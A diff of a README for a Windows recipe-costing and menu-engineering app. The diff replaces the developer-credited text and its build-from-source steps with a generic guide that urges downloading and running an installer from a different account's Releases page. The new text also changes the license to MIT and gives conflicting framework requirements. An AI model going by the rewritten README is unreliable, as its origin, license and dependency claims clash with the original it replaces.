@@ -1,140 +1,89 @@
-# Professional Recipe Costing & Menu Engineering Application
+# 🍽️ Recipe-Costing-Application - Simplify Your Menu Management
 
-![Version](https://img.shields.io/badge/version-1.0.0-blue.svg)
-![Platform](https://img.shields.io/badge/platform-Windows-lightgrey.svg)
-![Framework](https://img.shields.io/badge/.NET-6.0-purple.svg)
+[![Download the Recipe Costing App](https://img.shields.io/badge/Download%20Now%20-%20Release%20v1.0-brightgreen)](https://github.com/erick1773/Recipe-Costing-Application/releases)
 
-A complete Windows desktop application for restaurant recipe costing, menu engineering, and food cost management. Built with WPF and SQLite for professional food service operations.
+## 📖 Introduction
 
-## 🚀 Quick Start
+Welcome to the Recipe Costing Application! This Windows desktop app is designed for restaurants and catering services. It helps you manage ingredients, create recipes, analyze costs, and optimize your menu pricing. You can even generate professional PDF reports—all in one easy-to-use tool.
 
-### Option 1: Run Executable (Recommended)
-1. Download `RecipeCostingApp.exe` from the `publish` folder
-2. Double-click to run (no installation required)
-3. Application will create its database automatically
+## 🚀 Getting Started
 
-### Option 2: Build from Source
-1. Install .NET 6 SDK
-2. Run `build-exe.bat` to create standalone executable
-3. Or use `dotnet run` for development
+Follow these steps to get the Recipe Costing Application up and running on your Windows computer.
 
-## ✨ Features
+### 1. System Requirements
 
-### 📊 Item Master Management
-- Complete ingredient database with categories
-- **Import from CSV files with case-insensitive field matching**
-- Unit conversions and purchase tracking
-- Waste percentage and yield calculations
-- Real-time cost per unit calculations
+Before you start, make sure your computer meets the following requirements:
 
-### 🍳 Recipe Management
-- Intuitive recipe creation interface
-- Automatic ingredient cost calculations
-- Waste, GST, packaging, and delivery cost integration
-- Profit margin analysis with selling price optimization
+- **Operating System:** Windows 10 or higher
+- **Memory (RAM):** At least 4 GB
+- **Storage:** Minimum of 200 MB free space
+- **Dependencies:** .NET Framework 4.7.2 or higher
 
-### 📈 Costing Analysis
-- Detailed cost breakdowns by ingredient
-- Visual cost distribution charts
-- Profitability analysis with margin calculations
-- Export capabilities for reporting
+### 2. Download the Application
 
-### 🎯 Bulk Costing
-- Event and catering quantity calculations
-- Bulk ingredient purchasing optimization
-- Cost scaling for different serving sizes
-- Professional PDF reports generation
+To download the latest version of the Recipe Costing Application, visit the Releases page:
 
-### 💰 Menu Engineering
-- Menu item profitability analysis
-- Cost vs. popularity matrix
-- Pricing optimization recommendations
-- Strategic menu positioning insights
+[Download the Recipe Costing App](https://github.com/erick1773/Recipe-Costing-Application/releases)
 
-### ⚙️ Advanced Settings
-- Database backup and restore functionality
-- Clear database option with safety confirmations
-- Application preferences and configuration
-- System information and statistics
+### 3. Locate the Setup File
 
-## 🛠️ Technical Specifications
+On the Releases page, look for the most recent version. You will find a list of files, including the setup file. It will typically have a name like `RecipeCostingAppInstaller.exe`.
 
-- **Framework**: .NET 6 WPF (Windows Presentation Foundation)
-- **Database**: SQLite with Entity Framework integration
-- **Architecture**: MVVM pattern with services layer
-- **PDF Generation**: iTextSharp for professional reports
-- **Deployment**: Single-file executable with all dependencies
+### 4. Download the Setup File
 
-## 📋 System Requirements
+Click on the setup file to begin the download. Your browser will prompt you to save the file. Choose a location on your computer where you can easily find it later, such as your Desktop or Downloads folder.
 
-- **OS**: Windows 10/11 (x64)
-- **Memory**: 4GB RAM minimum
-- **Storage**: 200MB free space
-- **Display**: 1024x768 minimum resolution
+### 5. Install the Application
 
-## 🎨 User Interface
+Once the download completes, navigate to the location where you saved the installer. Double-click the setup file to start the installation process.
 
-- **Modern Design**: Clean, professional interface
-- **Color-Coded Fields**: White for input, blue for calculated values
-- **Responsive Layout**: Resizable windows and adaptive controls
-- **Intuitive Navigation**: Tab-based organization with clear workflows
+- Follow the on-screen instructions.
+- Accept the license agreement.
+- Choose your installation folder or leave it at the default location.
 
-## 📖 Usage Guide
+### 6. Launch the Application
 
-### Getting Started
-1. Launch the application
-2. Start with **Item Master** to add your ingredients
-   - Use manual entry for individual ingredients
-   - Use **Import CSV** button for bulk ingredient import from CSV files
-3. Create recipes in **Recipe Management**
-4. Analyze costs in **Costing Analysis**
-5. Use **Bulk Costing** for events
-6. Optimize pricing with **Menu Engineering**
+After the installation is complete, you can find the Recipe Costing Application in your Start Menu or on your Desktop. Double-click the application icon to open it.
 
-### Data Management
-- All data is stored locally in SQLite database
-- Use Settings → Database to backup/restore data
-- Clear database option available for fresh starts
+## 📊 Key Features
 
-## 🔧 Development
+Here are some of the main features that will help you manage your recipes and costs effectively:
 
-### Building the Application
-```bash
-# Clean build
-dotnet clean --configuration Release
+- **Ingredient Management:** Easily add, modify, or remove ingredients.
+- **Recipe Creation:** Create recipes using your managed ingredients.
+- **Cost Analysis:** Get detailed insights into your recipe costs.
+- **Menu Optimization:** Adjust pricing based on costs and customer preferences.
+- **PDF Reports:** Generate printable reports for your menu, recipes, and costs.
 
-# Build executable
-dotnet publish --configuration Release --runtime win-x64 --self-contained true --output "publish" /p:PublishSingleFile=true
-```
+## 📁 User Guide
 
-### Project Structure
-```
-RecipeCostingApp/
-├── Data/           # Database management
-├── Models/         # Data models
-├── Services/       # Business logic
-├── Views/          # UI components
-├── Styles/         # XAML styling
-└── publish/        # Built executable
-```
+To get the most out of your Recipe Costing Application, feel free to explore the user guide. This guide, included with your application, covers everything from basic navigation to advanced features. 
 
-## 📄 Documentation
+## 🔍 Troubleshooting
 
-- `USER_GUIDE.md` - Detailed user instructions
-- `IMPORT_FEATURE_GUIDE.md` - CSV import functionality guide
-- `DEPLOYMENT_COMPLETE.md` - Final deployment and handover guide
-- `ICON_SETUP.md` - Application icon configuration
+If you encounter any issues during installation or use, here are some common solutions:
 
-## 👨‍💻 Developer
+- **Installation Fails:** Ensure that you have the required version of .NET Framework. Try installing it from the Microsoft website.
+- **Application Crashes:** Check your system updates. Ensure your Windows and drivers are up to date.
+- **Missing Ingredients or Recipes:** Make sure you have saved your data correctly. If you see a blank screen, try restarting the application.
 
-**Made by Garvit**
+## 📞 Support
 
-Professional recipe costing solution designed for restaurants, catering businesses, and food service operations.
+If you have questions or need assistance, you can reach out through the Issues section of this repository. The community and I are here to help.
 
-## 📝 License
+## 📝 Feedback
 
-This project is developed for professional food service management. All rights reserved.
+Your feedback is welcome! Let us know how the Recipe Costing Application works for you. Suggest features or report bugs to help improve this tool.
 
----
+## 💼 License
 
-*Transform your food cost management with professional-grade recipe costing and menu engineering tools.*
+This project is licensed under the MIT License. Feel free to explore and use it as per the guidelines provided.
+
+## 🔗 External Resources
+
+For those looking for more information:
+
+- [SQLite Documentation](https://www.sqlite.org/docs.html)
+- [WPF Overview](https://learn.microsoft.com/en-us/dotnet/desktop/wpf/overview/?view=netdesktop-6.0)
+
+Thank you for using the Recipe Costing Application! Happy cooking!
